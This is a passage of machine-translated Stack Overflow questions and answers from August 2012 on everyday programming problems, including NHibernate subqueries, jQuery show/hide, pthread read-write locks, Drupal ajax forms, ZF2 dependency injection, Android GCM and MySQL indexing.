   string Name { get; set;} // etc.
} 
```

我想检索所有在某个日期范围内*没有订单的人。*SQL 最终会是这样的：

```
SELECT *
FROM Person
WHERE Id NOT IN (SELECT PersonId
                 FROM Order
                 WHERE CreatedDate BETWEEN '2012-01-01' and '2012-01-31') 
```

当我使用上述问题中提供的解决方案进行查询时，如果有 2100 人或更多人（SQL 不允许那么多参数），则它会失败。

此外，我无法将 Orders 集合添加到人员，因为这将涉及提取太多数据（我只想要一个日期范围）*。*

我怎样才能用 NHibernate 做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T18:12:30.973

您可以使用子查询...

```
var peopleWithOrdersInRange = QueryOver.Of<Order>()
    .WhereRestrictionOn(x => x.CreatedDate).IsBetween(fromDate).And(toDate)
    .SelectGroup(x => x.CreatedBy.Id);

var results = Session.QueryOver<Person>()
    .WithSubquery.WhereProperty(x => x.Id).NotIn(peopleWithOrdersInRange)
    .List(); 
```

这将产生确切的 SQL（在子查询中添加按人员 ID 分组）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-08T18:04:03.710

> 当我使用上述问题中提供的解决方案进行查询时，如果有 2100 人或更多人（SQL 不允许那么多参数），则它会失败。

据我了解，您确实在将订单集合传递给查询之前将其具体化。

这是一个应该可以工作的 linq 查询

```
var unwantedPersons = 
   from order in session.Query<Order>()
   where order.CreatedDate >= startDate && 
         order.CreatedDate <= endDate
   select order.CreatedBy.Id // NOTE: do not add .ToList() or .ToArray() here.
                             // It *should be* IQueryable<Person> 

var personsWitoutOrders = 
    (from person in session.Query<Person>()
     where !unwantedPersons.Contains(person.Id)
     select person).ToArray(); 
```

# javascript - 样式使 javascript 代码无法正常运行

> ID：11866483
> 
> 赞同：0
> 
> 时间：2012-08-08T14:17:04.153
> 
> 标签：javascript, jquery, html, hide, show

我在玩这个代码：http: [//jsfiddle.net/VmVAq/](http://jsfiddle.net/VmVAq/)

如您所见，在页面加载时，仅显示 DIV 1。正如你所注意到的，样式是内联的，所以我决定将它添加到标题中：http: [//jsfiddle.net/Ym96t/2/](http://jsfiddle.net/Ym96t/2/)

这就是问题所在。现在在页面加载时，所有的 DIV 都显示出来了，**为什么？**我是如何破解密码的？

如果您想在此处查看代码：

原来的：

```
<html>
<head>

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.4.4/jquery.min.js"></script>

<script type="text/javascript">
function showonlyone(thechosenone) {
     $('.newboxes').each(function(index) {
          if ($(this).attr("id") == thechosenone) {
               $(this).show(200);
          }
          else {
               $(this).hide(600);
          }
     });
}
</script>

</head>

<body>

             <div style="border: 1px solid blue; background-color: #99CCFF; padding: 5px; width: 150px;">
                <a id="myHeader1" href="javascript:showonlyone('newboxes1');" >show this one only</a>
             </div>
             <div class="newboxes" id="newboxes1" style="border: 1px solid black; background-color: #CCCCCC; display: block;padding: 5px; width: 150px;">Div #1</div>

             <div style="border: 1px solid blue; background-color: #99CCFF; padding: 5px; width: 150px;">
                <a id="myHeader2" href="javascript:showonlyone('newboxes2');" >show this one only</a>
             </div>
             <div class="newboxes" id="newboxes2" style="border: 1px solid black; background-color: #CCCCCC; display: none;padding: 5px; width: 150px;">Div #2</div>

             <div style="border: 1px solid blue; background-color: #99CCFF; padding: 5px; width: 150px;">
                <a id="myHeader3" href="javascript:showonlyone('newboxes3');" >show this one only</a>
             </div>
             <div class="newboxes" id="newboxes3" style="border: 1px solid black; background-color: #CCCCCC; display: none;padding: 5px; width: 150px;">Div #3</div>

</body>
</html> 
```

风格：

```
<html>
<head>

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.4.4/jquery.min.js"></script>

<script type="text/javascript">
function showonlyone(thechosenone) {
     $('.newboxes').each(function(index) {
          if ($(this).attr("id") == thechosenone) {
               $(this).show(200);
          }
          else {
               $(this).hide(600);
          }
     });
}
</script>

<style>
    #scoopout {
        border: 1px solid blue;
    background-color: #99CCFF;
    padding: 5px;
    width: 150px;
    }
</style>

</head>

<body>

             <div id="scoopout">
                <a id="myHeader1" href="javascript:showonlyone('newboxes1');" >show this one only</a>
             </div>
             <div class="newboxes" id="newboxes1">Div #1</div>

             <div id="scoopout">
                <a id="myHeader2" href="javascript:showonlyone('newboxes2');" >show this one only</a>
             </div>
             <div class="newboxes" id="newboxes2">Div #2</div>

             <div id="scoopout">
                <a id="myHeader3" href="javascript:showonlyone('newboxes3');" >show this one only</a>
             </div>
             <div class="newboxes" id="newboxes3">Div #3</div>

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-08T14:20:37.163

在第一个小提琴中，您给出了一些元素`display: none`。在第二个示例中，您没有这样做。

换句话说，您所做的不仅仅是将样式规则移动到一个`<style>`元素中——您还摆脱了一些 CSS。

您可以添加一个只显示一个的“就绪”处理程序。

```
$(function() { showonlyone('newboxes1'); }); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:42:27.067

好的，我已经重写了你的小提琴，即使你已经接受了答案，它在未来可能会有所帮助。

首先你要知道JS中的函数是对象，所以你可以设置属性。这样做可以让您在任何给定时间跟踪哪个元素是可见的，而无需使用邪恶的全局变量，或者取消绑定和重新绑定您的事件并使用闭包。我猜你已经听说过它们，但是从你的代码来看，那里有些陌生的领域。

我做的下一件事是识别所有可点击的元素，隐藏*“秘密”* div，并将点击事件附加到您的链接（使用`reveal`类）。然后，我为已显示的元素分配一个引用，以便您可以在下一次单击事件时再次隐藏它。

由于您使用的是 jquery 1.4.4（我想说*升级的时间），所以我保持非常简单：*

[一个工作小提琴](http://jsfiddle.net/Ym96t/9/)

这里的代码，用于评论/问题：欢迎评论

```
$(document).ready(function()
{//All this code will be executed when the page has loaded
    $('.newboxes').each(function()
    {
       $(this).hide(); 
    });
    $('.reveal').click(function showOne()
    {
       if (showOne.visible && showOne.visible.hide)
       {
           showOne.visible.hide(600);
       }
       if (showOne.visible && showOne.visible.attr('id').replace('newboxes','myHeader') === $(tihs).attr('id'))
       {
           showOne.visible = undefined;//set to undefined, otherwise the next click will try to hide the hidden div
           return;//stop here, don't invoke show method
       }
       showOne.visible = $('#'+$(this).attr('id').replace('myHeader','newboxes'));
       showOne.visible.show(200);
    });
    $('#myHeader1').click();//show the first div on page load
});//anything after this will be run as soon as possible, likely before the page loads 
```

# ruby-on-rails-3 - Rails Foreigner：使用 MySQL 的“测试”数据库的外键约束

> ID：11866485
> 
> 赞同：0
> 
> 时间：2012-08-08T14:17:12.407
> 
> 标签：ruby-on-rails-3, activerecord, foreigner

我正在尝试使用[Foreigner](https://github.com/matthuhiggins/foreigner/)在 Rails 中启用外键约束。它正在我的开发数据库上运行，但是当我尝试运行测试时出现以下错误：

```
Errors running test:units! #<ActiveRecord::StatementInvalid: Mysql2::Error: Can't create table 
'arizona_test.#sql-368_be' (errno: 150): ALTER TABLE `arizona_downloads` ADD CONSTRAINT 
`arizona_downloads_ibfk_1` FOREIGN KEY (`books_id`) REFERENCES `books`(id) ON DELETE SET NULL> 
```

奇怪的是，测试运行良好，最后我得到了这个错误。

我怀疑 Foreigner 正在尝试对测试数据库使用 SQLite 语法，却不知道我正在使用 MySQL（和 mysql2 适配器）。有没有办法告诉老外我正在使用 MySQL 作为测试数据库？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T15:38:10.013

仔细观察，我看到这显示了 MySQL errno 150。运行`SHOW ENGINE INNODB STATUS`显示：

```
120808 11:24:29 Error in foreign key constraint of table arizona_test/#sql-368_6e:
 FOREIGN KEY (`book_id`) REFERENCES `books`(id) ON DELETE SET NULL:
Cannot find an index in the referenced table where the
referenced columns appear as the first columns, or column types
in the table and the referenced table do not match for constraint. 
```

这是因为我的开发环境使用 bigint(20) 作为 id，而 schema.rb 有 int(11)，因为迁移依赖于 Rails 的默认 id 大小。

为了解决这个问题，我更改了[默认的主键列类型](https://stackoverflow.com/a/1442413/93995)，并重新进行了迁移。

# c++ - pthread_rwlock 可以同时拥有多少个读者？

> ID：11866486
> 
> 赞同：6
> 
> 时间：2012-08-08T14:17:20.160
> 
> 标签：c++, linux, multithreading, pthreads

我有一个多线程应用程序，它创建了 48 个线程，这些线程都需要访问一个公共属性（stl::map）。只有在线程启动时才会写入映射，其余时间将从中读取映射。这似乎是 pthread_rw_lock 的完美用例，而且一切似乎都运行良好。

我遇到了一个完全不相关的段错误并开始分析核心。使用 gdb，我执行了命令`info threads`并对结果感到非常惊讶。我观察到几个线程实际上正在按预期从映射中读取，但奇怪的是几个线程在等待 rw_lock 的 pthread_rwlock_rdlock() 中被阻塞。

这是等待锁的线程的堆栈跟踪：

```
#0  0xffffe430 in __kernel_vsyscall ()
#1  0xf76fe159 in __lll_lock_wait () from /lib/libpthread.so.0
#2  0xf76fab5d in pthread_rwlock_rdlock () from /lib/libpthread.so.0
#3  0x0804a81a in DiameterServiceSingleton::getDiameterService(void*) () 
```

有这么多线程，很难说有多少正在读取，有多少被阻塞，但我不明白为什么***任何***线程会被阻塞等待读取，考虑到其他线程已经在读取。

所以这是我的问题：为什么有些线程被阻塞等待读取 rw_lock，而其他线程已经在读取它？似乎可以同时读取的线程数是有限制的。

我查看了`pthread_rwlock_attr_t`功能，没有看到任何相关内容。

操作系统是 Linux，SUSE 11。

以下是相关代码：

```
{
  pthread_rwlock_init(&serviceMapRwLock_, NULL);
}

// This method is called for each request processed by the threads
Service *ServiceSingleton::getService(void *serviceId)
{
  pthread_rwlock_rdlock(&serviceMapRwLock_);
    ServiceMapType::const_iterator iter = serviceMap_.find(serviceId);
    bool notFound(iter == serviceMap_.end());
  pthread_rwlock_unlock(&serviceMapRwLock_);

  if(notFound)
  {
    return NULL;
  }

  return iter->second;
}

// This method is only called when the app is starting
void ServiceSingleton::addService(void *serviceId, Service *service)
{
  pthread_rwlock_wrlock(&serviceMapRwLock_);
    serviceMap_[serviceId] = service;
  pthread_rwlock_unlock(&serviceMapRwLock_);
} 
```

**更新：**

正如 MarkB 在评论中提到的，如果我将 pthread_rwlockattr_getkind_np() 设置为优先考虑写入器，并且有写入器阻塞等待，那么观察到的行为将是有意义的。但是，我使用我认为优先考虑读者的默认值。我刚刚验证***没有***线程阻塞等待写入。我还按照@Shahbaz 在评论中的建议更新了代码并获得了相同的结果。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-08T15:23:42.567

您只是观察到与获取锁有关的固有性能问题。这需要一些时间，而您恰好在其中捕获了这些线程。当受锁保护的操作持续时间很短时尤其如此。

> **编辑：**阅读源代码，`glibc`用于`lll_lock`保护其自己的 pthread 库数据结构中的关键部分。`pthread_rwlock_rdlock`检查几个标志并递增计数器，因此它在持有锁的同时执行这些操作。一旦这些都完成了，锁就会被释放`lll_unlock`。

为了演示，我实现了一个简短的例程，该例程在获取`rwlock`. 主线程等待它们完成。但在等待之前，它会打印线程实现的并发性。

```
enum { CONC = 50 };

pthread_rwlock_t rwlock;
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t cond = PTHREAD_COND_INITIALIZER;
unsigned count;

void *routine(void *arg)
{
    int *fds = static_cast<int *>(arg);
    pthread_rwlock_rdlock(&rwlock);
    pthread_mutex_lock(&mutex);
    ++count;
    if (count == CONC) pthread_cond_signal(&cond);
    pthread_mutex_unlock(&mutex);
    sleep(5);
    pthread_rwlock_unlock(&rwlock);
    pthread_t self = pthread_self();
    write(fds[1], &self, sizeof(self));
    return 0;
} 
```

并且主线程等待计数器达到 50：

```
int main()
{
    int fds[2];
    pipe(fds);
    pthread_rwlock_init(&rwlock, 0);
    pthread_mutex_lock(&mutex);
    for (int i = 0; i < CONC; i++) {
        pthread_t tid;
        pthread_create(&tid, NULL, routine, fds);
    }
    while (count < CONC) pthread_cond_wait(&cond, &mutex);
    pthread_mutex_unlock(&mutex);
    std::cout << "count: " << count << std::endl;
    for (int i = 0; i < CONC; i++) {
        pthread_t tid;
        read(fds[0], &tid, sizeof(tid));
        pthread_join(tid, 0);
    }
    pthread_rwlock_destroy(&rwlock);
    pthread_exit(0);
} 
```

**编辑：**使用 C++11 线程支持简化了示例：

```
enum { CONC = 1000 };
std::vector<std::thread> threads;

pthread_rwlock_t rwlock;
std::mutex mutex;
std::condition_variable cond;
unsigned count;

void *routine(int self)
{
    pthread_rwlock_rdlock(&rwlock);
    { std::unique_lock<std::mutex> lk(mutex);
      if (++count == CONC) cond.notify_one(); }
    sleep(5);
    pthread_rwlock_unlock(&rwlock);
    return 0;
}

int main()
{
    pthread_rwlock_init(&rwlock, 0);
    { std::unique_lock<std::mutex> lk(mutex);
      for (int i = 0; i < CONC; i++) {
          threads.push_back(std::thread(routine, i));
      }
      cond.wait(lk, [](){return count == CONC;}); }
    std::cout << "count: " << count << std::endl;
    for (int i = 0; i < CONC; i++) {
        threads[i].join();
    }
    pthread_rwlock_destroy(&rwlock);
    pthread_exit(0);
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-10T21:11:09.797

附带说明一下，上面发布的代码已损坏。您无法从 rw_lock'd 部分访问 iter->second，因为一旦您解锁 rw_lock，写入者就可以删除映射中的任何元素，从而使其上的任何迭代器无效。

我知道你没有在你的情况下这样做，因为你在程序执行开始之后没有写任何东西，但仍然值得一提。

另外，作为旁注，由于您描述的行为似乎是序列化的（作者在开始时写入地图，然后读者从现在开始读取“只读”地图），您可能应该这样写：

```
int writerDoneWithMap = 0;
// pthread_cond & mutex init here

// The writer write to the map here 

// Then they signal the reader that they are done with it
while (!__sync_bool_compare_and_swap(&writerDoneWithMap, 1, writerDoneWithMap));
pthread_cond_broadcast here

// The readers will then simply do this:
while (!writerDoneWithMap) 
{
     // pthread_cond_wait here
}
// Read the data without locks. 
```

如果作者已经完成了映射，上面的代码避免了对读者的任何锁定，如果他们没有，那么你就求助于典型的 pthread_cond/mutex 技术。当且仅当您有作家 THEN 读者（但这就是您所说的）时，上面的代码才是正确的，否则它将失败。

# php - 形成收音机来控制可见/不可见的代码元素（ajax）

> ID：11866493
> 
> 赞同：0
> 
> 时间：2012-08-08T14:17:40.800
> 
> 标签：php, drupal

我正在尝试使用 ajax 根据您在某些单选按钮上所做的选择来使某些表单元素变得可见或不可见。

有两种选择：收音机的“标签”或“表格”。“tag”是默认的，body 字段一开始是可见的。但是，如果您单击“表单”选项，则正文字段会消失。然后我希望能够再次单击“标签”并使正文字段再次可见，但在这里我遇到了麻烦。

以下是相关代码：

```
function format_and_filter_form_protocol_node_form_alter(&$form, &$form_state,$form_id) {

   $form['protocol_form_view_radios'] =  array(
                             '#type' => 'radios',
                             '#title' => 'Input by:',
                             '#options' => array('taging','form'),
                             '#default_value' => 0,
                             '#ajax' => array(
                                              'callback' => 'format_and_filter_change_input_callback',
                                              'wrapper' => 'body-add-more-wrapper',
                                              ),
                    '#executes_submit_callback' => FALSE,
                             '#limit_validation_errors' => array(),
                             '#weight' => -31,
                             );

}

function format_and_filter_change_input_callback($form,&$form_state) {

   if ($form_state['input']['protocol_form_view_radios'] == 0) {
     $form['body']['#access'] = TRUE;
   }
   else {
     $form['body']['#access'] = FALSE;
   }

  return $form['body'];
} 
```

有没有人解释为什么 $form['body']['#access'] = TRUE 不会让 body 字段再次可见？我检查了 $form 数组，发现当 $form_state['input']['protocol_form_view_radios'] == 0 为真时，$form['body']['#access'] 实际上设置为 1。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T15:17:37.620

#ajax 回调中有一个任性的空间

```
'callback' => 'format_and_filter_change_inpu t_callback', 
```

您的代码中是否也存在这种情况？

# java - 受保护的访问类型

> ID：11866496
> 
> 赞同：3
> 
> 时间：2012-08-08T14:17:45.597
> 
> 标签：java, subclass, access-specifier

> **可能重复：**
> [在 Java 中，公共、默认、受保护和私有之间有什么区别？](https://stackoverflow.com/questions/215497/in-java-whats-the-difference-between-public-default-protected-and-private)

为什么一个包中的子类不能通过超类的引用访问它的超类（在另一个包中）的受保护成员？我正在努力解决这一点。请帮我

```
package points;
public class Point {
  protected int x, y;
}

package threePoint;
import points.Point;
public class Point3d extends Point {
  protected int z;
  public void delta(Point p) {

    p.x += this.x;          // compile-time error: cannot access p.x
    p.y += this.y;          // compile-time error: cannot access p.y

  } 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-08T14:20:35.190

受保护的成员可以被类、包中的其他类以及它的子类隐式访问。即，子类可以`x`从它自己的父类访问。

您能够访问的`this.x`事实证明`x`从超类是可访问的。如果`x`在超类中是私有的，`this.x`则会出错。

当您说`p.x`您正在尝试访问其他实例`x`时，而不是在它自己的层次结构中。这在包装之外是不允许的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:20:33.143

因为您引用了*不同*实例的成员`Point`。这是不允许的。

您当然可以像使用`this.x`.

# jquery - 使用 jQuery 显示和隐藏 div 后，div 没有通过 CSS 隐藏

> ID：11866498
> 
> 赞同：0
> 
> 时间：2012-08-08T14:17:55.293
> 
> 标签：jquery, css

我有一个小的网络应用程序，我在其中显示和隐藏了很多 DIV。但是，有时我需要向隐藏 div 的 div 添加一个 CSS 类（使用`display:none`而不是 jQuery 的`hide()`函数），因为我仍然需要知道给定的 div 是否最初显示在屏幕上。我通常使用 jQuery`addClass`和`removeClass`相应的。

但是，我在执行此操作时遇到了问题。看起来如果 div 之前已被隐藏并显示，则向 div 添加 display:none 类将不起作用。

我想知道是否有任何我可以在不求助于使用的情况下使用的解决方法`hide()`。

以下是一些 JSFiddle 示例，向您展示我在说什么：

[JSFiddle 示例 1](http://jsfiddle.net/D6QFQ/1/) - 将使用 CSS 类正确隐藏 DIV。

[JSFiddle 示例 2](http://jsfiddle.net/LgL4v/) - 使用 show() 和 hide() 函数后，它不会使用 CSS 类正确隐藏 DIV。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:24:22.570

您遇到的问题是 jQuery 的 hide() 函数将内联 CSS 添加到元素中：

```
<div id="divTest" class="hideDiv" style="display: block;"> 
```

其中 display 设置为`block`，因此您的 hideDiv 类将被内联覆盖，因为它在 CSS 规则中被认为是“更严格的”。一个有点丑陋的解决方法是将您的 hideDiv CSS 规则更改为：

```
.hideDiv
{
    display: none !important;
} 
```

该`!important`部分将使其优先于内联 CSS。

**编辑**：此外，我建议坚持使用一种显示/隐藏内容的方式（您自己的*或*jQuery）。使用 jQuery show/hide 进行所有显示/隐藏，但您仍然可以添加一个用于跟踪的类，只是不要让该类隐藏您的元素。

所以机会按钮 JavaScript 是这样的：

```
$("#btnHideDiv").on("click", function()
{
    $("#divTest").addClass("hideDiv");
    $("#divTest").hide();
}); 
```

并从 hideDiv 类中完全删除隐藏的 CSS。现在您仍然可以使用 jQuery 来查找页面加载后隐藏的 div，而不会遇到隐藏/显示不工作且无需求助于`!important`.

我会说，一个更优雅的解决您的问题的方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:21:40.750

我也做了很多 - 我的解决方案是根本不使用 .hide()/show，而只需创建一个“隐藏的”css 类并像你所做的那样切换或添加/删除。

这样做的一个好处是，如果您需要知道当前状态，您可以查询 .hasClass 以查看它是否（被该类隐藏），如果您希望它最初隐藏，您可以简单地将该类添加到元素标记中.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T14:23:43.480

这是因为 Jquery`hide()/show()`放置了一个内联显示属性来隐藏或显示 div。所以你的课没有被申请。使用后可以`.css('display','')`用来清理 div`hide()/show()`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-08T14:26:54.627

尝试这个：

[http://jsfiddle.net/LgL4v/2/](http://jsfiddle.net/LgL4v/2/)

它只是使用 Javascript/jQuery 将 div 的显示属性设置为无，而不是依赖 CSS 类。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-08T14:21:33.390

你可以试试吗？

```
 .hideDiv 
 {
    opacity:0;
}​ 
```

# zend-framework2 - ZF2 如何从控制器外部获取实体管理器

> ID：11866504
> 
> 赞同：6
> 
> 时间：2012-08-08T14:18:07.700
> 
> 标签：zend-framework2

我们可以使用控制器访问实体管理器`$this->getServiceLocator()->get('doctrine.entitymanager.orm_default');`

但是我们如何在 Zendframework 2 的项目的其余部分访问实体管理器单例实例。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-08T22:07:39.527

做到这一点的“正确”方法是使用工厂将实体管理器注入到任何需要它的类中。除了工厂，类不应该真正了解 ServiceLocator。因此，您的模块配置如下所示：

```
 'controllers' => array(
     'factories' => array(
          'mycontroller' => 'My\Namespace\MyControllerFactory'
     )
 ) 
```

然后你的工厂类看起来像这样：

```
use Zend\ServiceManager\FactoryInterface;
use Zend\ServiceManager\ServiceLocatorInterface;

class MyControllerFactory implements FactoryInterface
{

    public function createService(ServiceLocatorInterface $serviceLocator)
    {
        $serviceLocator = $serviceLocator->getServiceLocator();

        $myController = new MyController;
        $myController->setEntityManager(
            $serviceLocator->get('doctrine.entitymanager.orm_default')
        );

        return $myController;
    }
} 
```

对于需要使用实体管理器的任何其他类，请遵循相同的模式。

如果您有大量使用实体管理器的类，您可能需要考虑将您自己的 Initalizer 添加到 SerivceManager 中，这样无需工厂即可注入实体管理器。

# pdf - Docbook 到 PDF（带有表格等）

> ID：11866510
> 
> 赞同：1
> 
> 时间：2012-08-08T14:18:16.527
> 
> 标签：pdf, docbook

请给我推荐一个离线`Docbook->Pdf`转换工具。docbook 文档包含很多表格（无法`pdf`使用`Apache FOP`基于工具的工具正确呈现。`"table layout auto isn't implemented"`出现消息并且（结果我认为）某些表格的列中的文本重叠）。

我发现了非常有用的工具`http://docbookpublishing.com/`，但它只能在线使用。

`docbook2pdf`不会转换，出现消息（`"jade:/usr/share/sgml/docbook/dsssl-stylesheets/print/dbtable.dsl:372:10:E: 1st argument for primitive "string->number" of wrong type: "#f" not a string"`），如果没有深入调查就很难理解。

Haskell`pandoc`工具，也经过测试，但我不了解该工具的实际功能（据我了解，它只转换`Docbook->latex`而不是`pdflatex`使用）。使用 pandoc 转换的文档看起来很奇怪（页面顺序更改，目录丢失）并且呈现质量比其他文档更差。我没有找到快速定制它的方法。

# android - 向我的应用程序的所有用户发送多播消息

> ID：11866518
> 
> 赞同：1
> 
> 时间：2012-08-08T14:18:30.723
> 
> 标签：android, google-cloud-messaging

我已经在我的应用程序中设置了谷歌云消息服务并且一切正常，但是如果我向我的应用程序发送消息，则只有我知道 deviceId 的用户才能收到消息。我如何将我的消息发送到使用我的应用程序的所有设备？

非常感谢你

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-08T14:23:14.313

您无法向未注册的设备发送消息。

首先，这些设备应该使用 注册`GCMRegistrar.register`并将registrationId发送到服务器，然后您就可以向这些设备发送消息。

```
 final String regId = GCMRegistrar.getRegistrationId(context);

    if (!regId.equals("")) {
        // Device is alredy registered. This checks whether it is registered
        // on the server or not.
        if (!GCMRegistrar.isRegisteredOnServer(context)) {
            // Save regId to server
            registerInBackground(context, regId);
        } else {
            Log.v(TAG, "Already registered");
        }
    } else {
        GCMRegistrar.register(context, senderId);
    } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-08T14:29:22.293

无法向尚未注册的设备发送 GCM 消息。

如果您需要向所有设备进行故障安全广播，那么最好让您的应用定期拉取。一个简单的带有版本号的 web 服务器上的平面 json 文件就足够了，但真正的痛苦是判断它被拉取的频率、时间和方式。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T14:22:24.757

设备上的客户端从设备上的 GCM 库接收注册 ID，然后应该通过正常渠道将其发送到您的服务器，以及您想要的任何识别信息。您的服务器需要记住哪个 RegID 用于哪个用户或设备。有关详细信息，请参阅：http: [//developer.android.com/guide/google/gcm/gs.html](http://developer.android.com/guide/google/gcm/gs.html)

# visual-studio-2010 - 标记一个不受自动格式化规则影响的区域

> ID：11866520
> 
> 赞同：3
> 
> 时间：2012-08-08T14:18:38.210
> 
> 标签：visual-studio-2010, resharper, autoformatting

我正在寻找一种方法来保持我的代码区域具有一定数量的制表符缩进。选项卡表示与其上方字段的关系。

IE

```
public string Foo1
    pubic string F1Bar1
public string Foo2
public string Foo3
    public string F3Bar1
    public string F3Bar2
        public string F3B2Foobar1
public string Foo4 
```

运行自动格式化当然会对齐所有这些字符串，有没有办法标记这部分代码被自动格式化程序忽略。保留缩进，而其余代码确实被格式化？

（我可以使用 Resharper）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T19:37:58.030

在 ReSharper 7.0 或更早版本中无法做到这一点。但是你可以在这里为这个功能投票[http://youtrack.jetbrains.com/issue/RSRP-9997](http://youtrack.jetbrains.com/issue/RSRP-9997)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-09T08:48:22.223

您可以在之后添加**换行符`public`**并在之前缩进`string`，即：

```
 public
      string F1Bar1; 
```

这种格式不会改变，至少在我的安装/设置中（R# 5.1.3，VS 2010）。

不幸的是，这仅有助于**第二级**。第三级或更高级别是不可能的。

# java - 如何在 Java 中读取属性文件中的范围值

> ID：11866523
> 
> 赞同：0
> 
> 时间：2012-08-08T14:18:49.910
> 
> 标签：java, drools

我想从属性文件中读取值作为一系列值。我的任务是，根据获得的分数计算结果。例如，点是，

```
<100 : some result.
101 - 110 : Some result.
111 - 120 : Some result.
121 - 130 : some result.
.....
.....
991 - 1000 : some result.
>1000 : some result. 
```

有什么方法可以从属性文件中存储和获取结果，而不是将 [key,value] 对从 1 放置到 1000，因为我也可能得到浮点值？我应该为所有可能的条件编写 if else 语句吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:22:05.820

我会使用一个数组

```
String[] results = "<100,<100,<100,<100,<100,<100,<100,<100,<100,<100,result101-110,result111-120, etc".split(",");

String result = results[(value-1)/10]; 
```

或者，如果范围不同，您可以使用 NavigableMap

```
NavigableMap<Double, String> map = ...
String result = map.higherEntry(value).getValue(); 
```

在这种情况下，格式可以是`upper-limit` `result`

```
100 some result.
110 Some result.
120 Some result.
130 some result.
.....
.....
1000 Some result.
Infinity some result. 
```

# mysql - 三个条件下要添加哪些索引来加速 COUNT(*) 查询

> ID：11866524
> 
> 赞同：0
> 
> 时间：2012-08-08T14:18:52.873
> 
> 标签：mysql, indexing, query-optimization

这是我的查询：

```
SELECT COUNT(`id`)
FROM `comments`
WHERE
    `user_id` != '1' -- Author does not need to know about his own comments
    AND (
        `article_id` IN (4, 2476, 14954, 83981, 83982)
        OR `request_id` IN (3, 5, 7)
    ); 
```

和表：

```
CREATE TABLE `comments` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `part_id` int(11) DEFAULT NULL,
  `article_id` int(11) DEFAULT NULL,
  `request_id` int(11) DEFAULT NULL,
  `user_id` int(11) DEFAULT NULL,
  `name` varchar(500) DEFAULT NULL,
  `comment` text,
  `add_date` int(11) DEFAULT NULL,
  `ip` text,
  PRIMARY KEY (`id`),
  KEY `key_article_id_add_date` (`article_id`,`add_date`),
  KEY `key_part_id_add_date` (`part_id`,`add_date`),
  KEY `add_date` (`add_date`),
  KEY `request_id` (`request_id`),
  KEY `user_id` (`user_id`,`article_id`,`request_id`)
) ENGINE=innodb AUTO_INCREMENT=3536452 DEFAULT CHARSET=utf8 
```

无论我如何尝试以及添加什么索引，mysql 都会扫描所有 3039138 行，并且查询优先。这是解释输出：

```
+----+-------------+----------+------+--------------------------------------------+------+---------+------+---------+-------------+
| id | select_type | table    | type | possible_keys                              | key  | key_len | ref  | rows    | Extra       |
+----+-------------+----------+------+--------------------------------------------+------+---------+------+---------+-------------+
|  1 | SIMPLE      | comments | ALL  | key_article_id_add_date,user_id,request_id | NULL | NULL    | NULL | 3039138 | Using where |
+----+-------------+----------+------+--------------------------------------------+------+---------+------+---------+-------------+ 
```

如果我删除其中一个条件（或） `user_id`，mysql 使用索引似乎没有问题，但是对于所有 3 个 - 没有任何帮助。`article_id``request_id`

有什么想法可以索引评论表以便 mysql 可以在此查询上使用索引吗？或者是否有任何其他解决方案可以提高此查询性能。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:29:45.807

首先检查此查询的当前执行计划，并确定它是否使用您为这三列创建的键。如果它没有使用该特定索引，则强制 sql 使用该索引，如下所示

```
SELECT Count(`id`)
FROM   `comments` USE INDEX (user_id_corresponding_index_name)
WHERE  `user_id` != '1'
       -- Author does not need to know about his own comments    
       AND ( `article_id` IN ( 4, 2476, 14954, 83981, 83982 )
              OR `request_id` IN ( 3, 5, 7 ) ); 
```

请将 user_id_corresponding_idex_name 替换为表中为 user_id 键创建的非聚集索引的相应名称。

[http://dev.mysql.com/doc/refman/4.1/en/index-hints.html](http://dev.mysql.com/doc/refman/4.1/en/index-hints.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:22:12.703

在 where 子句中使用的任何列上添加索引并不能保证其使用或快速性。它取决于数据量和 dbms impl 逻辑。但一般来说，您使用 where 子句查询的任何列，在其上添加索引都会有所帮助。

在这个你会想要在所有三列（user_id、article_id 或 request_id）上添加索引

# c# - C# 你是否打算调用方法

> ID：11866525
> 
> 赞同：1
> 
> 时间：2012-08-08T14:18:55.557
> 
> 标签：c#, vb.net, vba, esri

我正在尝试转换为 C# 的 Vba 代码。我已经非常接近了，但我可以弄清楚为什么我不断收到这个错误。错误无法将方法组“NextFeature”转换为非委托类型“ESRI.ArcGIS.Carto.IFeatureSelection”。您是否打算调用该方法？

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

using ESRI.ArcGIS.ArcMapUI;
using ESRI.ArcGIS.Carto;
using ESRI.ArcGIS.Geodatabase;

namespace ArcMapAddin1
{
    public partial class frmParcelReader : Form
    {
        public frmParcelReader()
        {
